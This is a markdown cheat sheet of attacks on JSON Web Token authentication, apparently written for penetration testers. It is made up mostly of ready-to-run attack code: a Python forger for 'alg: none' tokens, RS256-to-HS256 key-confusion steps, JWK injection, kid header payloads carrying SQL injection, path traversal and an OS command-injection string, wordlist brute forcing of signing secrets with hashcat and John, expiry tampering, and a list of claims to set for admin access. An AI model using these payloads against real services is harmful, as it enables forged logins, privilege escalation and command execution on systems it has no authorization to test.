# JWT Attack Deep Reference

## JWT Structure

```
HEADER.PAYLOAD.SIGNATURE
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMzM3fQ.SIGNATURE
```

Each part is base64url-encoded (no padding).

## Attack 1: Algorithm: none

Removes signature entirely — some libraries accept it.

```python
import base64, json

def forge_alg_none(original_token, payload_changes: dict):
    parts = original_token.split(".")
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
    payload.update(payload_changes)
    
    new_header  = base64.urlsafe_b64encode(
        json.dumps({"alg":"none","typ":"JWT"}).encode()
    ).rstrip(b"=").decode()
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b"=").decode()
    return f"{new_header}.{new_payload}."

forged = forge_alg_none("eyJ...", {"role":"admin","is_admin":True})
print(forged)
```

## Attack 2: RS256 → HS256 Key Confusion

Server uses RS256 (asymmetric). Attacker forges HS256 token signed with the PUBLIC key.
Many libraries verify HS256 using `key` parameter — if that's the public key, it works.

```bash
# Step 1: Get public key
curl https://target.com/.well-known/jwks.json
# or: /api/public-key, /oauth/certs, /auth/certs

# Step 2: Convert JWK to PEM
python3 -c "
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
import base64, json, struct

jwk = json.load(open('jwks.json'))['keys'][0]
n = int.from_bytes(base64.urlsafe_b64decode(jwk['n']+'=='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(jwk['e']+'=='), 'big')
pub = RSAPublicNumbers(e, n).public_key()
print(pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode())
" > public.pem

# Step 3: jwt_tool key confusion attack
python3 jwt_tool.py TOKEN -X k -pk public.pem
```

## Attack 3: JWK Injection

Embed your own public key in the JWT header.

```python
# jwt_tool
python3 jwt_tool.py TOKEN -X i

# Manual: add "jwk" field to header with your generated key
# {"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```

## Attack 4: KID (Key ID) Injection

If the `kid` header is used to look up the signing key:

```json
// SQL injection via kid
{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'attacker-secret' --"}

// Path traversal via kid
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
// Sign with empty string secret

// OS command injection via kid
{"alg":"HS256","typ":"JWT","kid":"key.pem | id; echo '"}
```

## Attack 5: Weak Secret Brute Force

```bash
# Hashcat
hashcat -a 0 -m 16500 "eyJhbGci...full.token.here" /usr/share/wordlists/rockyou.txt

# John the Ripper
python3 -c "print('eyJ...')" > token.txt
john token.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# jwt_tool
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets
# secret, password, 123456, test, key, jwt, token, admin, 12345678
```

## Attack 6: Expired Token Acceptance

```bash
# Modify exp claim to future time, re-sign if you know the secret
# Or if alg:none works — just change exp

python3 -c "
import base64, json, time
payload = {'user_id':1337,'role':'admin','exp': int(time.time()) + 99999999}
print(base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode())
"
```

## JWT Claim Targets for Escalation

```json
{
  "user_id": 1,
  "role": "admin",
  "roles": ["admin", "superuser"],
  "is_admin": true,
  "is_staff": true,
  "is_superuser": true,
  "scope": "admin read write delete",
  "permissions": ["*"],
  "group": "administrators",
  "account_type": "enterprise",
  "tier": "admin",
  "exp": 9999999999
}
```

## Tools

```bash
# jwt_tool (most complete)
pip install jwt-tool
python3 jwt_tool.py --help

# jwt.io (online decoder)
# https://jwt.io

# CyberChef JWT operations
# https://gchq.github.io/CyberChef/

# Burp Suite JWT Editor extension (BApp Store)
```
